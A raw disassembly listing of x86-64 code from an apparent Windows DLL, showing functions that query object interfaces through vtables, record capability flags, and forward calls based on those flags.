   1800025d6:	85 c0                	test   %eax,%eax
   1800025d8:	0f 85 09 03 00 00    	jne    0x1800028e7
   1800025de:	48 8b 0e             	mov    (%rsi),%rcx
   1800025e1:	48 85 c9             	test   %rcx,%rcx
   1800025e4:	0f 84 fd 02 00 00    	je     0x1800028e7
   1800025ea:	48 8b 01             	mov    (%rcx),%rax
   1800025ed:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   1800025f2:	ff 50 18             	call   *0x18(%rax)
   1800025f5:	83 0b 01             	orl    $0x1,(%rbx)
   1800025f8:	48 8b 0e             	mov    (%rsi),%rcx
   1800025fb:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180002601:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   180002608:	00 
   180002609:	48 8b 01             	mov    (%rcx),%rax
   18000260c:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   180002611:	41 8d 51 fd          	lea    -0x3(%r9),%edx
   180002615:	ff 50 48             	call   *0x48(%rax)
   180002618:	85 c0                	test   %eax,%eax
   18000261a:	75 09                	jne    0x180002625
   18000261c:	39 44 24 40          	cmp    %eax,0x40(%rsp)
   180002620:	74 03                	je     0x180002625
   180002622:	83 0b 02             	orl    $0x2,(%rbx)
   180002625:	48 8b 0e             	mov    (%rsi),%rcx
   180002628:	ba 0f 00 00 00       	mov    $0xf,%edx
   18000262d:	48 8b 01             	mov    (%rcx),%rax
   180002630:	ff 50 20             	call   *0x20(%rax)
   180002633:	48 89 87 f0 00 00 00 	mov    %rax,0xf0(%rdi)
   18000263a:	48 85 c0             	test   %rax,%rax
   18000263d:	74 03                	je     0x180002642
   18000263f:	83 0b 04             	orl    $0x4,(%rbx)
   180002642:	48 8b 0e             	mov    (%rsi),%rcx
   180002645:	ba 0b 00 00 00       	mov    $0xb,%edx
   18000264a:	48 8b 01             	mov    (%rcx),%rax
   18000264d:	ff 50 20             	call   *0x20(%rax)
   180002650:	48 89 87 f8 00 00 00 	mov    %rax,0xf8(%rdi)
   180002657:	48 85 c0             	test   %rax,%rax
   18000265a:	74 03                	je     0x18000265f
   18000265c:	83 0b 08             	orl    $0x8,(%rbx)
   18000265f:	48 8b 0e             	mov    (%rsi),%rcx
   180002662:	ba 11 00 00 00       	mov    $0x11,%edx
   180002667:	48 8b 01             	mov    (%rcx),%rax
   18000266a:	ff 50 20             	call   *0x20(%rax)
   18000266d:	48 89 87 00 01 00 00 	mov    %rax,0x100(%rdi)
   180002674:	48 85 c0             	test   %rax,%rax
   180002677:	74 31                	je     0x1800026aa
   180002679:	83 0b 10             	orl    $0x10,(%rbx)
   18000267c:	48 8b 8f 00 01 00 00 	mov    0x100(%rdi),%rcx
   180002683:	33 c0                	xor    %eax,%eax
   180002685:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000268a:	48 8b 01             	mov    (%rcx),%rax
   18000268d:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180002692:	ff 50 18             	call   *0x18(%rax)
   180002695:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180002699:	c1 e0 10             	shl    $0x10,%eax
   18000269c:	0b 44 24 24          	or     0x24(%rsp),%eax
   1800026a0:	3d 02 00 01 00       	cmp    $0x10002,%eax
   1800026a5:	72 03                	jb     0x1800026aa
   1800026a7:	83 0b 20             	orl    $0x20,(%rbx)
   1800026aa:	48 8b 0e             	mov    (%rsi),%rcx
   1800026ad:	ba 18 00 00 00       	mov    $0x18,%edx
   1800026b2:	48 8b 01             	mov    (%rcx),%rax
   1800026b5:	ff 50 20             	call   *0x20(%rax)
   1800026b8:	48 89 87 20 01 00 00 	mov    %rax,0x120(%rdi)
   1800026bf:	48 85 c0             	test   %rax,%rax
   1800026c2:	74 2e                	je     0x1800026f2
   1800026c4:	33 c9                	xor    %ecx,%ecx
   1800026c6:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1800026cb:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1800026d0:	4c 8b 00             	mov    (%rax),%r8
   1800026d3:	48 8b c8             	mov    %rax,%rcx
   1800026d6:	41 ff 50 18          	call   *0x18(%r8)
   1800026da:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800026de:	c1 e0 10             	shl    $0x10,%eax
   1800026e1:	0b 44 24 24          	or     0x24(%rsp),%eax
   1800026e5:	3d 00 00 01 00       	cmp    $0x10000,%eax
   1800026ea:	72 06                	jb     0x1800026f2
   1800026ec:	81 0b 00 80 00 00    	orl    $0x8000,(%rbx)
   1800026f2:	48 8b 0e             	mov    (%rsi),%rcx
   1800026f5:	ba 17 00 00 00       	mov    $0x17,%edx
   1800026fa:	48 8b 01             	mov    (%rcx),%rax
   1800026fd:	ff 50 20             	call   *0x20(%rax)
   180002700:	48 8b 0e             	mov    (%rsi),%rcx
   180002703:	ba 15 00 00 00       	mov    $0x15,%edx
   180002708:	48 89 87 28 01 00 00 	mov    %rax,0x128(%rdi)
   18000270f:	48 8b 01             	mov    (%rcx),%rax
   180002712:	ff 50 20             	call   *0x20(%rax)
   180002715:	48 89 87 18 01 00 00 	mov    %rax,0x118(%rdi)
   18000271c:	48 85 c0             	test   %rax,%rax
   18000271f:	0f 84 59 01 00 00    	je     0x18000287e
   180002725:	33 c9                	xor    %ecx,%ecx
   180002727:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   18000272c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180002731:	4c 8b 00             	mov    (%rax),%r8
   180002734:	48 8b c8             	mov    %rax,%rcx
   180002737:	41 ff 50 18          	call   *0x18(%r8)
   18000273b:	85 c0                	test   %eax,%eax
   18000273d:	0f 85 3b 01 00 00    	jne    0x18000287e
   180002743:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   180002748:	0f 82 30 01 00 00    	jb     0x18000287e
   18000274e:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   180002755:	ba 01 00 00 00       	mov    $0x1,%edx
   18000275a:	48 8b 01             	mov    (%rcx),%rax
   18000275d:	ff 50 28             	call   *0x28(%rax)
   180002760:	85 c0                	test   %eax,%eax
   180002762:	75 06                	jne    0x18000276a
   180002764:	81 0b 80 00 00 00    	orl    $0x80,(%rbx)
   18000276a:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   180002771:	ba 02 00 00 00       	mov    $0x2,%edx
   180002776:	48 8b 01             	mov    (%rcx),%rax
   180002779:	ff 50 28             	call   *0x28(%rax)
   18000277c:	85 c0                	test   %eax,%eax
   18000277e:	75 06                	jne    0x180002786
   180002780:	81 0b 00 01 00 00    	orl    $0x100,(%rbx)
   180002786:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   18000278d:	ba 03 00 00 00       	mov    $0x3,%edx
   180002792:	48 8b 01             	mov    (%rcx),%rax
   180002795:	ff 50 28             	call   *0x28(%rax)
   180002798:	85 c0                	test   %eax,%eax
   18000279a:	75 06                	jne    0x1800027a2
   18000279c:	81 0b 00 02 00 00    	orl    $0x200,(%rbx)
   1800027a2:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   1800027a9:	ba 04 00 00 00       	mov    $0x4,%edx
   1800027ae:	48 8b 01             	mov    (%rcx),%rax
   1800027b1:	ff 50 28             	call   *0x28(%rax)
   1800027b4:	85 c0                	test   %eax,%eax
   1800027b6:	75 06                	jne    0x1800027be
   1800027b8:	81 0b 00 04 00 00    	orl    $0x400,(%rbx)
   1800027be:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   1800027c5:	ba 05 00 00 00       	mov    $0x5,%edx
   1800027ca:	48 8b 01             	mov    (%rcx),%rax
   1800027cd:	ff 50 28             	call   *0x28(%rax)
   1800027d0:	85 c0                	test   %eax,%eax
   1800027d2:	75 06                	jne    0x1800027da
   1800027d4:	81 0b 00 08 00 00    	orl    $0x800,(%rbx)
   1800027da:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   1800027e1:	ba 06 00 00 00       	mov    $0x6,%edx
   1800027e6:	48 8b 01             	mov    (%rcx),%rax
   1800027e9:	ff 50 28             	call   *0x28(%rax)
   1800027ec:	85 c0                	test   %eax,%eax
   1800027ee:	75 06                	jne    0x1800027f6
   1800027f0:	81 0b 00 10 00 00    	orl    $0x1000,(%rbx)
   1800027f6:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   1800027fd:	ba 08 00 00 00       	mov    $0x8,%edx
   180002802:	48 8b 01             	mov    (%rcx),%rax
   180002805:	ff 50 28             	call   *0x28(%rax)
   180002808:	85 c0                	test   %eax,%eax
   18000280a:	75 06                	jne    0x180002812
   18000280c:	81 0b 00 20 00 00    	orl    $0x2000,(%rbx)
   180002812:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   180002819:	ba 09 00 00 00       	mov    $0x9,%edx
   18000281e:	48 8b 01             	mov    (%rcx),%rax
   180002821:	ff 50 28             	call   *0x28(%rax)
   180002824:	85 c0                	test   %eax,%eax
   180002826:	75 06                	jne    0x18000282e
   180002828:	81 0b 00 40 00 00    	orl    $0x4000,(%rbx)
   18000282e:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   180002835:	ba 0a 00 00 00       	mov    $0xa,%edx
   18000283a:	48 8b 01             	mov    (%rcx),%rax
   18000283d:	ff 50 28             	call   *0x28(%rax)
   180002840:	85 c0                	test   %eax,%eax
   180002842:	75 10                	jne    0x180002854
   180002844:	48 83 bf 28 01 00 00 	cmpq   $0x0,0x128(%rdi)
   18000284b:	00 
   18000284c:	74 06                	je     0x180002854
   18000284e:	81 0b 00 00 01 00    	orl    $0x10000,(%rbx)
   180002854:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   18000285b:	48 8b 01             	mov    (%rcx),%rax
   18000285e:	ff 50 30             	call   *0x30(%rax)
   180002861:	85 c0                	test   %eax,%eax
   180002863:	75 13                	jne    0x180002878
   180002865:	48 8b 8f 18 01 00 00 	mov    0x118(%rdi),%rcx
   18000286c:	8b d5                	mov    %ebp,%edx
   18000286e:	48 8b 01             	mov    (%rcx),%rax
   180002871:	ff 50 38             	call   *0x38(%rax)
   180002874:	85 c0                	test   %eax,%eax
   180002876:	74 06                	je     0x18000287e
   180002878:	81 23 7f 80 fe ff    	andl   $0xfffe807f,(%rbx)
   18000287e:	48 8b 0e             	mov    (%rsi),%rcx
   180002881:	ba 14 00 00 00       	mov    $0x14,%edx
   180002886:	48 8b 01             	mov    (%rcx),%rax
   180002889:	ff 50 20             	call   *0x20(%rax)
   18000288c:	48 89 87 08 01 00 00 	mov    %rax,0x108(%rdi)
   180002893:	48 85 c0             	test   %rax,%rax
   180002896:	74 4f                	je     0x1800028e7
   180002898:	83 0b 40             	orl    $0x40,(%rbx)
   18000289b:	48 8b 8f 08 01 00 00 	mov    0x108(%rdi),%rcx
   1800028a2:	48 8b 01             	mov    (%rcx),%rax
   1800028a5:	ff 50 48             	call   *0x48(%rax)
   1800028a8:	48 8b 8f 08 01 00 00 	mov    0x108(%rdi),%rcx
   1800028af:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1800028b4:	89 87 c0 00 00 00    	mov    %eax,0xc0(%rdi)
   1800028ba:	48 8b 01             	mov    (%rcx),%rax
   1800028bd:	ff 50 18             	call   *0x18(%rax)
   1800028c0:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800028c4:	c1 e0 10             	shl    $0x10,%eax
   1800028c7:	0b 44 24 24          	or     0x24(%rsp),%eax
   1800028cb:	83 bf c4 00 00 00 01 	cmpl   $0x1,0xc4(%rdi)
   1800028d2:	89 87 10 01 00 00    	mov    %eax,0x110(%rdi)
   1800028d8:	75 0d                	jne    0x1800028e7
   1800028da:	48 8b 8f 08 01 00 00 	mov    0x108(%rdi),%rcx
   1800028e1:	48 8b 01             	mov    (%rcx),%rax
   1800028e4:	ff 50 20             	call   *0x20(%rax)
   1800028e7:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1800028ec:	8b 03                	mov    (%rbx),%eax
   1800028ee:	89 87 e0 00 00 00    	mov    %eax,0xe0(%rdi)
   1800028f4:	33 c0                	xor    %eax,%eax
   1800028f6:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800028fb:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180002900:	48 83 c4 30          	add    $0x30,%rsp
   180002904:	5f                   	pop    %rdi
   180002905:	c3                   	ret
   180002906:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000290b:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180002910:	b8 02 00 00 00       	mov    $0x2,%eax
   180002915:	48 83 c4 30          	add    $0x30,%rsp
   180002919:	5f                   	pop    %rdi
   18000291a:	c3                   	ret
   18000291b:	cc                   	int3
   18000291c:	cc                   	int3
   18000291d:	cc                   	int3
   18000291e:	cc                   	int3
   18000291f:	cc                   	int3
   180002920:	48 83 ec 38          	sub    $0x38,%rsp
   180002924:	48 85 c9             	test   %rcx,%rcx
   180002927:	74 46                	je     0x18000296f
   180002929:	85 d2                	test   %edx,%edx
   18000292b:	74 42                	je     0x18000296f
   18000292d:	4d 85 c0             	test   %r8,%r8
   180002930:	74 3d                	je     0x18000296f
   180002932:	44 8b 54 24 60       	mov    0x60(%rsp),%r10d
   180002937:	45 85 d2             	test   %r10d,%r10d
   18000293a:	74 33                	je     0x18000296f
   18000293c:	f6 81 e0 00 00 00 10 	testb  $0x10,0xe0(%rcx)
   180002943:	75 0a                	jne    0x18000294f
   180002945:	b8 06 00 00 00       	mov    $0x6,%eax
   18000294a:	48 83 c4 38          	add    $0x38,%rsp
   18000294e:	c3                   	ret
   18000294f:	48 8b 89 00 01 00 00 	mov    0x100(%rcx),%rcx
   180002956:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   18000295b:	48 8b 01             	mov    (%rcx),%rax
   18000295e:	ff 50 28             	call   *0x28(%rax)
   180002961:	33 c9                	xor    %ecx,%ecx
   180002963:	85 c0                	test   %eax,%eax
   180002965:	0f 95 c1             	setne  %cl
   180002968:	8b c1                	mov    %ecx,%eax
   18000296a:	48 83 c4 38          	add    $0x38,%rsp
   18000296e:	c3                   	ret
   18000296f:	b8 02 00 00 00       	mov    $0x2,%eax
   180002974:	48 83 c4 38          	add    $0x38,%rsp
   180002978:	c3                   	ret
   180002979:	cc                   	int3
   18000297a:	cc                   	int3
   18000297b:	cc                   	int3
   18000297c:	cc                   	int3
   18000297d:	cc                   	int3
   18000297e:	cc                   	int3
   18000297f:	cc                   	int3
   180002980:	48 83 ec 38          	sub    $0x38,%rsp
   180002984:	48 85 c9             	test   %rcx,%rcx
   180002987:	74 52                	je     0x1800029db
   180002989:	48 85 d2             	test   %rdx,%rdx
   18000298c:	74 4d                	je     0x1800029db
   18000298e:	45 85 c0             	test   %r8d,%r8d
   180002991:	74 48                	je     0x1800029db
   180002993:	4d 85 c9             	test   %r9,%r9
   180002996:	74 43                	je     0x1800029db
   180002998:	8b 44 24 68          	mov    0x68(%rsp),%eax
   18000299c:	85 c0                	test   %eax,%eax
   18000299e:	74 3b                	je     0x1800029db
   1800029a0:	f6 81 e0 00 00 00 20 	testb  $0x20,0xe0(%rcx)
   1800029a7:	75 0a                	jne    0x1800029b3
   1800029a9:	b8 06 00 00 00       	mov    $0x6,%eax
   1800029ae:	48 83 c4 38          	add    $0x38,%rsp
   1800029b2:	c3                   	ret
   1800029b3:	48 8b 89 00 01 00 00 	mov    0x100(%rcx),%rcx
   1800029ba:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1800029be:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800029c2:	4c 8b 11             	mov    (%rcx),%r10
   1800029c5:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1800029c9:	41 ff 52 38          	call   *0x38(%r10)
   1800029cd:	33 c9                	xor    %ecx,%ecx
   1800029cf:	85 c0                	test   %eax,%eax
   1800029d1:	0f 95 c1             	setne  %cl
   1800029d4:	8b c1                	mov    %ecx,%eax
   1800029d6:	48 83 c4 38          	add    $0x38,%rsp
   1800029da:	c3                   	ret
   1800029db:	b8 02 00 00 00       	mov    $0x2,%eax
   1800029e0:	48 83 c4 38          	add    $0x38,%rsp
   1800029e4:	c3                   	ret
   1800029e5:	cc                   	int3
   1800029e6:	cc                   	int3
   1800029e7:	cc                   	int3
   1800029e8:	cc                   	int3
   1800029e9:	cc                   	int3
   1800029ea:	cc                   	int3
   1800029eb:	cc                   	int3
   1800029ec:	cc                   	int3
   1800029ed:	cc                   	int3
   1800029ee:	cc                   	int3
   1800029ef:	cc                   	int3
   1800029f0:	48 83 ec 38          	sub    $0x38,%rsp
   1800029f4:	48 85 c9             	test   %rcx,%rcx
   1800029f7:	74 46                	je     0x180002a3f
   1800029f9:	85 d2                	test   %edx,%edx
   1800029fb:	74 42                	je     0x180002a3f
   1800029fd:	4d 85 c0             	test   %r8,%r8
   180002a00:	74 3d                	je     0x180002a3f
   180002a02:	44 8b 54 24 60       	mov    0x60(%rsp),%r10d
   180002a07:	45 85 d2             	test   %r10d,%r10d
   180002a0a:	74 33                	je     0x180002a3f
   180002a0c:	f6 81 e0 00 00 00 10 	testb  $0x10,0xe0(%rcx)
   180002a13:	75 0a                	jne    0x180002a1f
   180002a15:	b8 06 00 00 00       	mov    $0x6,%eax
   180002a1a:	48 83 c4 38          	add    $0x38,%rsp
   180002a1e:	c3                   	ret
   180002a1f:	48 8b 89 00 01 00 00 	mov    0x100(%rcx),%rcx
   180002a26:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   180002a2b:	48 8b 01             	mov    (%rcx),%rax
   180002a2e:	ff 50 20             	call   *0x20(%rax)
   180002a31:	33 c9                	xor    %ecx,%ecx
   180002a33:	85 c0                	test   %eax,%eax
   180002a35:	0f 95 c1             	setne  %cl
   180002a38:	8b c1                	mov    %ecx,%eax
   180002a3a:	48 83 c4 38          	add    $0x38,%rsp
   180002a3e:	c3                   	ret
   180002a3f:	b8 02 00 00 00       	mov    $0x2,%eax
   180002a44:	48 83 c4 38          	add    $0x38,%rsp
   180002a48:	c3                   	ret
   180002a49:	cc                   	int3
   180002a4a:	cc                   	int3
   180002a4b:	cc                   	int3
   180002a4c:	cc                   	int3
   180002a4d:	cc                   	int3
   180002a4e:	cc                   	int3
   180002a4f:	cc                   	int3
   180002a50:	48 83 ec 38          	sub    $0x38,%rsp
   180002a54:	48 85 c9             	test   %rcx,%rcx
   180002a57:	74 52                	je     0x180002aab
   180002a59:	48 85 d2             	test   %rdx,%rdx
   180002a5c:	74 4d                	je     0x180002aab
   180002a5e:	45 85 c0             	test   %r8d,%r8d
   180002a61:	74 48                	je     0x180002aab
   180002a63:	4d 85 c9             	test   %r9,%r9
   180002a66:	74 43                	je     0x180002aab
   180002a68:	8b 44 24 68          	mov    0x68(%rsp),%eax
   180002a6c:	85 c0                	test   %eax,%eax
   180002a6e:	74 3b                	je     0x180002aab
   180002a70:	f6 81 e0 00 00 00 20 	testb  $0x20,0xe0(%rcx)
   180002a77:	75 0a                	jne    0x180002a83
   180002a79:	b8 06 00 00 00       	mov    $0x6,%eax
   180002a7e:	48 83 c4 38          	add    $0x38,%rsp
   180002a82:	c3                   	ret
   180002a83:	48 8b 89 00 01 00 00 	mov    0x100(%rcx),%rcx
   180002a8a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180002a8e:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180002a92:	4c 8b 11             	mov    (%rcx),%r10
   180002a95:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180002a99:	41 ff 52 30          	call   *0x30(%r10)
   180002a9d:	33 c9                	xor    %ecx,%ecx
   180002a9f:	85 c0                	test   %eax,%eax
   180002aa1:	0f 95 c1             	setne  %cl
   180002aa4:	8b c1                	mov    %ecx,%eax
   180002aa6:	48 83 c4 38          	add    $0x38,%rsp
   180002aaa:	c3                   	ret
   180002aab:	b8 02 00 00 00       	mov    $0x2,%eax
   180002ab0:	48 83 c4 38          	add    $0x38,%rsp
   180002ab4:	c3                   	ret
   180002ab5:	cc                   	int3
   180002ab6:	cc                   	int3
   180002ab7:	cc                   	int3
   180002ab8:	cc                   	int3
   180002ab9:	cc                   	int3
   180002aba:	cc                   	int3
   180002abb:	cc                   	int3
   180002abc:	cc                   	int3
   180002abd:	cc                   	int3
   180002abe:	cc                   	int3
   180002abf:	cc                   	int3
   180002ac0:	48 83 ec 28          	sub    $0x28,%rsp
   180002ac4:	48 85 c9             	test   %rcx,%rcx
   180002ac7:	74 36                	je     0x180002aff
   180002ac9:	48 85 d2             	test   %rdx,%rdx
   180002acc:	74 31                	je     0x180002aff
   180002ace:	f7 81 e0 00 00 00 00 	testl  $0x8000,0xe0(%rcx)
   180002ad5:	80 00 00 
   180002ad8:	75 0a                	jne    0x180002ae4
   180002ada:	b8 06 00 00 00       	mov    $0x6,%eax
   180002adf:	48 83 c4 28          	add    $0x28,%rsp
   180002ae3:	c3                   	ret
   180002ae4:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   180002aeb:	48 8b 01             	mov    (%rcx),%rax
   180002aee:	ff 50 28             	call   *0x28(%rax)
   180002af1:	33 c9                	xor    %ecx,%ecx
   180002af3:	85 c0                	test   %eax,%eax
   180002af5:	0f 95 c1             	setne  %cl
   180002af8:	8b c1                	mov    %ecx,%eax
   180002afa:	48 83 c4 28          	add    $0x28,%rsp
   180002afe:	c3                   	ret
   180002aff:	b8 02 00 00 00       	mov    $0x2,%eax
   180002b04:	48 83 c4 28          	add    $0x28,%rsp
   180002b08:	c3                   	ret
   180002b09:	cc                   	int3
   180002b0a:	cc                   	int3
   180002b0b:	cc                   	int3
   180002b0c:	cc                   	int3
   180002b0d:	cc                   	int3
   180002b0e:	cc                   	int3
   180002b0f:	cc                   	int3
   180002b10:	40 55                	rex push %rbp
   180002b12:	41 56                	push   %r14
   180002b14:	41 57                	push   %r15
   180002b16:	48 83 ec 30          	sub    $0x30,%rsp
   180002b1a:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   180002b1f:	48 89 5d 30          	mov    %rbx,0x30(%rbp)
   180002b23:	48 89 75 38          	mov    %rsi,0x38(%rbp)
   180002b27:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   180002b2b:	4c 89 6d 48          	mov    %r13,0x48(%rbp)
   180002b2f:	48 8b 05 ca 64 01 00 	mov    0x164ca(%rip),%rax        # 0x180019000
   180002b36:	48 33 c5             	xor    %rbp,%rax
   180002b39:	48 89 45 00          	mov    %rax,0x0(%rbp)
   180002b3d:	49 8b f8             	mov    %r8,%rdi
   180002b40:	44 8b fa             	mov    %edx,%r15d
   180002b43:	4c 8b e9             	mov    %rcx,%r13
   180002b46:	48 85 c9             	test   %rcx,%rcx
   180002b49:	0f 84 21 01 00 00    	je     0x180002c70
   180002b4f:	85 d2                	test   %edx,%edx
   180002b51:	74 09                	je     0x180002b5c
   180002b53:	4d 85 c0             	test   %r8,%r8
   180002b56:	0f 84 14 01 00 00    	je     0x180002c70
   180002b5c:	f7 81 e0 00 00 00 00 	testl  $0x10000,0xe0(%rcx)
   180002b63:	00 01 00 
   180002b66:	75 0a                	jne    0x180002b72
   180002b68:	b8 06 00 00 00       	mov    $0x6,%eax
   180002b6d:	e9 03 01 00 00       	jmp    0x180002c75
   180002b72:	4b 8d 04 bf          	lea    (%r15,%r15,4),%rax
   180002b76:	33 f6                	xor    %esi,%esi
   180002b78:	4d 8b f7             	mov    %r15,%r14
   180002b7b:	48 8d 0c 85 00 48 83 	lea    -0x137cb800(,%rax,4),%rcx
   180002b82:	ec 
   180002b83:	28 48 8b             	sub    %cl,-0x75(%rax)
   180002b86:	0d 12 6c 01 00       	or     $0x16c12,%eax
   180002b8b:	ff 15 a7 e4 00 00    	call   *0xe4a7(%rip)        # 0x180011038
   180002b91:	48 85 c0             	test   %rax,%rax
   180002b94:	75 0c                	jne    0x180002ba2
   180002b96:	b9 01 00 00 00       	mov    $0x1,%ecx
   180002b9b:	ff 15 27 e5 00 00    	call   *0xe527(%rip)        # 0x1800110c8
   180002ba1:	cc                   	int3
   180002ba2:	8b 0d 05 6c 01 00    	mov    0x16c05(%rip),%ecx        # 0x1800197ad
   180002ba8:	48 03 c8             	add    %rax,%rcx
   180002bab:	48 83 c4 28          	add    $0x28,%rsp
   180002baf:	48 ff e1             	rex.W jmp *%rcx
   180002bb2:	2a 00                	sub    (%rax),%al
   180002bb4:	00 48 2b             	add    %cl,0x2b(%rax)
   180002bb7:	e0 48                	loopne 0x180002c01
   180002bb9:	8d 5c 24 20          	lea    0x20(%rsp),%ebx
   180002bbd:	48 85 db             	test   %rbx,%rbx
   180002bc0:	74 28                	je     0x180002bea
   180002bc2:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   180002bc8:	48 83 c3 10          	add    $0x10,%rbx
   180002bcc:	eb 1c                	jmp    0x180002bea
   180002bce:	e8 ed 29 00 00       	call   0x1800055c0
   180002bd3:	48 8b d8             	mov    %rax,%rbx
   180002bd6:	48 85 c0             	test   %rax,%rax
   180002bd9:	74 0f                	je     0x180002bea
   180002bdb:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   180002be1:	48 83 c3 10          	add    $0x10,%rbx
   180002be5:	eb 03                	jmp    0x180002bea
   180002be7:	48 8b de             	mov    %rsi,%rbx
   180002bea:	45 85 ff             	test   %r15d,%r15d
   180002bed:	74 4b                	je     0x180002c3a
   180002bef:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   180002bf3:	48 2b fb             	sub    %rbx,%rdi
   180002bf6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180002bfd:	00 00 00 
   180002c00:	83 7c 0f f8 01       	cmpl   $0x1,-0x8(%rdi,%rcx,1)
   180002c05:	8b c6                	mov    %esi,%eax
   180002c07:	48 8d 49 14          	lea    0x14(%rcx),%rcx
   180002c0b:	0f 94 c0             	sete   %al
   180002c0e:	89 41 e4             	mov    %eax,-0x1c(%rcx)
   180002c11:	8b 44 0f e8          	mov    -0x18(%rdi,%rcx,1),%eax
   180002c15:	89 41 e8             	mov    %eax,-0x18(%rcx)
   180002c18:	8b 44 0f ec          	mov    -0x14(%rdi,%rcx,1),%eax
   180002c1c:	89 41 ec             	mov    %eax,-0x14(%rcx)
   180002c1f:	8b 44 0f f0          	mov    -0x10(%rdi,%rcx,1),%eax
   180002c23:	03 44 0f e8          	add    -0x18(%rdi,%rcx,1),%eax
   180002c27:	89 41 f0             	mov    %eax,-0x10(%rcx)
   180002c2a:	8b 44 0f f4          	mov    -0xc(%rdi,%rcx,1),%eax
   180002c2e:	03 44 0f ec          	add    -0x14(%rdi,%rcx,1),%eax
   180002c32:	89 41 f4             	mov    %eax,-0xc(%rcx)
   180002c35:	49 ff ce             	dec    %r14
   180002c38:	75 c6                	jne    0x180002c00
   180002c3a:	49 8b 8d 28 01 00 00 	mov    0x128(%r13),%rcx
   180002c41:	4c 8b c3             	mov    %rbx,%r8
   180002c44:	41 8b d7             	mov    %r15d,%edx
   180002c47:	48 8b 01             	mov    (%rcx),%rax
   180002c4a:	ff 50 30             	call   *0x30(%rax)
   180002c4d:	8b f8                	mov    %eax,%edi
   180002c4f:	48 85 db             	test   %rbx,%rbx
   180002c52:	74 12                	je     0x180002c66
   180002c54:	81 7b f0 dd dd 00 00 	cmpl   $0xdddd,-0x10(%rbx)
   180002c5b:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   180002c5f:	75 05                	jne    0x180002c66
   180002c61:	e8 1a 29 00 00       	call   0x180005580
   180002c66:	85 ff                	test   %edi,%edi
   180002c68:	40 0f 95 c6          	setne  %sil
   180002c6c:	8b c6                	mov    %esi,%eax
   180002c6e:	eb 05                	jmp    0x180002c75
   180002c70:	b8 02 00 00 00       	mov    $0x2,%eax
   180002c75:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   180002c79:	48 33 cd             	xor    %rbp,%rcx
   180002c7c:	e8 af 25 00 00       	call   0x180005230
   180002c81:	48 8b 5d 30          	mov    0x30(%rbp),%rbx
   180002c85:	48 8b 75 38          	mov    0x38(%rbp),%rsi
   180002c89:	48 8b 7d 40          	mov    0x40(%rbp),%rdi
   180002c8d:	4c 8b 6d 48          	mov    0x48(%rbp),%r13
   180002c91:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   180002c95:	41 5f                	pop    %r15
   180002c97:	41 5e                	pop    %r14
   180002c99:	5d                   	pop    %rbp
   180002c9a:	c3                   	ret
   180002c9b:	cc                   	int3
   180002c9c:	cc                   	int3
   180002c9d:	cc                   	int3
   180002c9e:	cc                   	int3
   180002c9f:	cc                   	int3
   180002ca0:	48 83 ec 28          	sub    $0x28,%rsp
   180002ca4:	48 85 c9             	test   %rcx,%rcx
   180002ca7:	75 08                	jne    0x180002cb1
   180002ca9:	8d 41 02             	lea    0x2(%rcx),%eax
   180002cac:	48 83 c4 28          	add    $0x28,%rsp
   180002cb0:	c3                   	ret
   180002cb1:	48 8b 89 f8 00 00 00 	mov    0xf8(%rcx),%rcx
   180002cb8:	48 85 c9             	test   %rcx,%rcx
   180002cbb:	75 08                	jne    0x180002cc5
   180002cbd:	8d 41 06             	lea    0x6(%rcx),%eax
   180002cc0:	48 83 c4 28          	add    $0x28,%rsp
   180002cc4:	c3                   	ret
   180002cc5:	48 8b 01             	mov    (%rcx),%rax
   180002cc8:	0f b6 d2             	movzbl %dl,%edx
   180002ccb:	ff 50 18             	call   *0x18(%rax)
   180002cce:	33 c9                	xor    %ecx,%ecx
   180002cd0:	85 c0                	test   %eax,%eax
   180002cd2:	0f 95 c1             	setne  %cl
